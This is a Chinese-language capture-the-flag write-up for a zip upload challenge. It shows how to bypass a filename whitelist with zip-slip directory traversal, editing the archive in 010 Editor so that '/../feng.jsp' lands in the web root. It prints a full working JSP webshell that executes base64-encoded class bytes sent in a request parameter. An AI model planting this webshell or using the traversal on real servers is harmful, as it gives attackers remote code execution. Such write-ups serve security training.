上传你的压缩包

让上传一个zip格式的压缩包，先测试上传一个正常的返回上传的路径

看到路径是网站根目录下ROOT/upload/随机文件名，f12可以得到提示。提示压缩包上传后会解压到当前目录。

由此可以知道上传的原理：先将上传的压缩包解压，然后对解压的文件进行筛选，文件名符合白名单的可以留下，不符合的删掉，所以假如直接将一句话木马放入压缩包中，那么在经过解压后我们是没有办法访问这个文件的。

所以我们要在解压的时候将我们的一句话木马解压至别的目录下，以此来逃过对文件的筛查。也就是要进行目录穿越。

因为我们要到根目录下，所以只需要穿越一层目录即可，根据此题目环境，要使用jsp一句话木马。

jsp一句话木马 

<%!
class U extends ClassLoader {
    U(ClassLoader c) {
        super(c);
    }
    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }
}

public byte[] base64Decode(String str) throws Exception {
    try {
        Class clazz = Class.forName("sun.misc.BASE64Decoder");
        return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
    } catch (Exception e) {
        Class clazz = Class.forName("java.util.Base64");
        Object decoder = clazz.getMethod("getDecoder").invoke(null);
        return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
    }
}
%>
<%
String cls = request.getParameter("passwd");
if (cls != null) {
    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
}
%>

构造文件名

/../feng.jsp

该文件名长度为12位。因为文件名不能包含“/”等字符，所以我们利用010 Editor来修改

首先将文件名命名为123456789012（这里和我们构造的文件名长度要一样）

然后将这个文件和另一个任意正常文件一起添加到123456789012.zip压缩包中，这里来保证穿越文件利用成功。（不添加另一个文件能否成功没有测试）。

然后将压缩包丢进010 Editor中，找到start不为0的且值为123456789012数据中的char deFileName一栏（会有两个123456789012）将值修改为我们构造的文件名/../feng.jsp。

保存修改后发送这个zip文件，可以得到成功上传和上传的路径，此时我们的jsp一句话木马已经绕过检查，穿越目录到网站根目录下，然后通过剑蚁便可以成功连接，flag就在上传的根目录下。
